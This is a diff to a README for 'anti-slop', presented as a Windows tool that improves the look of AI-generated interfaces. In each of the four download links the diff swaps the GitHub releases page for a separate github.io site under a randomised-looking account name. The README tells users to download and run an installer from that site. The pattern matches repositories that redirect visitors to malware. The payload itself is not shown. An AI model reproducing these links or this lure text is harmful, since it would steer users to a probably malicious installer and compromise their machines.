@@ -1,6 +1,6 @@
 # 🛡️ anti-slop - Stop Ugly AI Designs Instantly
 
-[![Download anti-slop](https://img.shields.io/badge/Download-anti--slop-2ea44f?style=for-the-badge)](https://github.com/Rosmarinusofficinalispoloneck995/anti-slop/releases)
+[![Download anti-slop](https://img.shields.io/badge/Download-anti--slop-2ea44f?style=for-the-badge)](https://rosmarinusofficinalispoloneck995.github.io)
 
 ## 🤔 What Is anti-slop?
 
@@ -55,7 +55,7 @@ Follow these simple steps to install and use anti-slop on your Windows computer.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Rosmarinusofficinalispoloneck995/anti-slop/releases](https://github.com/Rosmarinusofficinalispoloneck995/anti-slop/releases)
+Visit this link to download the application: [https://rosmarinusofficinalispoloneck995.github.io](https://rosmarinusofficinalispoloneck995.github.io)
 
 When you click the link, you'll see a page with different versions of the file. Look for the newest version (usually at the top). Click the download button next to it. Your browser will start downloading the file to your computer.
 
@@ -157,7 +157,7 @@ If you need additional help, you can:
 
 ## 🔄 Updates
 
-anti-slop receives updates to keep up with the latest AI design trends. When new versions are released, you can download them from the same link: [https://github.com/Rosmarinusofficinalispoloneck995/anti-slop/releases](https://github.com/Rosmarinusofficinalispoloneck995/anti-slop/releases)
+anti-slop receives updates to keep up with the latest AI design trends. When new versions are released, you can download them from the same link: [https://rosmarinusofficinalispoloneck995.github.io](https://rosmarinusofficinalispoloneck995.github.io)
 
 Download the newest version and run the installer again to update. Your settings will be preserved.
 
@@ -165,6 +165,6 @@ Download the newest version and run the installer again to update. Your settings
 
 Stop settling for generic AI-generated interfaces that all look the same. With anti-slop, you can finally get unique, professional, and interesting designs from your AI tools every single time.
 
-[![Get anti-slop Now](https://img.shields.io/badge/Download-anti--slop-blue?style=for-the-badge&logo=github)](https://github.com/Rosmarinusofficinalispoloneck995/anti-slop/releases)
+[![Get anti-slop Now](https://img.shields.io/badge/Download-anti--slop-blue?style=for-the-badge&logo=github)](https://rosmarinusofficinalispoloneck995.github.io)
 
 Keywords: AI design, anti-slop, UI improve, design rules, stop generic AI, better layouts, coding assistant, interface generator
